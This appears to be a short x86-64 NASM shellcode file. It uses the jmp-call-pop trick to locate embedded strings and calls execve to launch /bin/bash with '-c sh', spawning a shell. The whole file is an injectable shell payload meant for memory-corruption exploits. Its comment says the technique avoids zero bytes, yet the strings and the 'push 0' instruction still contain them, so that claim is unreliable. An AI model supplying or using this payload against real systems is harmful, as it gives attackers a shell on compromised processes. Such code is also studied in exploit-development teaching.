SECTION .text
global main

;; The reason we do jmp,call,pop instead of call (forward)
;; is so that there aren't lots of zeros in the shellcode
;; as with c-strings this is the null-terminator

main:
	jmp  @data0
@filename:
	pop  rdi
	push 0
	jmp  @data2
@argv2:
	jmp  @data1
@argv1:
	lea  rax,[rdi+5]	;; argv[0] is the basename
	push rax
	mov  rsi, rsp       ;; argv
	xor	 rax,rax
	cdq					;; envp
	mov	 al,0x3b		;; execve
	syscall
@data0:
	call @filename
	db '/bin/bash',0    ;; filename
@data1:
	call @argv1
	db '-c',0
@data2:
	call @argv2
	db 'sh',0
